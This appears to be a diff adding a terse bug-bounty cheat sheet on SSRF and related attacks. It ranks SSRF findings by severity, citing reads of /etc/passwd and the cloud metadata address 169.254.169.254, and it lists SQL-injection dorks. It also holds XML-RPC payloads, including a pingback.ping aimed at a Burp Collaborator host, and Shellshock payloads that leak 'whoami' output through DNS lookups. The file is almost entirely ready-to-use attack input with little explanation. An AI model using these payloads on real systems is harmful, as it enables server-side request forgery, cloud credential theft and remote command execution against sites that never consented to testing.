@@ -1,0 +1,52 @@
+P2 bug Full response: etc/password
+        : Magic ip (169.254.169.254) to meta data pull        http://169.254.169.254/latest/meta-data/
+                
+                                                                      https://127.0.0.1/http://repeater-delay 10/
+
+P3 Bug: Internal port scan
+
+P4 Bug if you can esculate this any ssrf (http interaction)
+
+P5 Bug Only DNS hit.
+
+
+
+---------------------------------------------------------------------------------
+=> Basic dorks :-
+php?id=1
+php?id=shopping
+php?id="callback" "feedback" etc
+
+----------------------------------------------------------------------------------
+
+
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value>http://8hqzrzlvw4nabsf9bj3wgsl3vu1kp9.burpcollaborator.net/</value>
+</param>
+<param>
+<value>https://URL OF THE SITE/</value>
+</param>
+</params>
+</methodCall>
+
+
+
+
+------------------------------------------------------------------------------------------
+
+
+=> Shellshock payloads :- (Access from - Shellshock payloads github)
+
+( ) { :; }; /usr/bin/nslookup $(whoami).
+
+( ) { foo;}; /usr/bin/nslookup $(whoami).
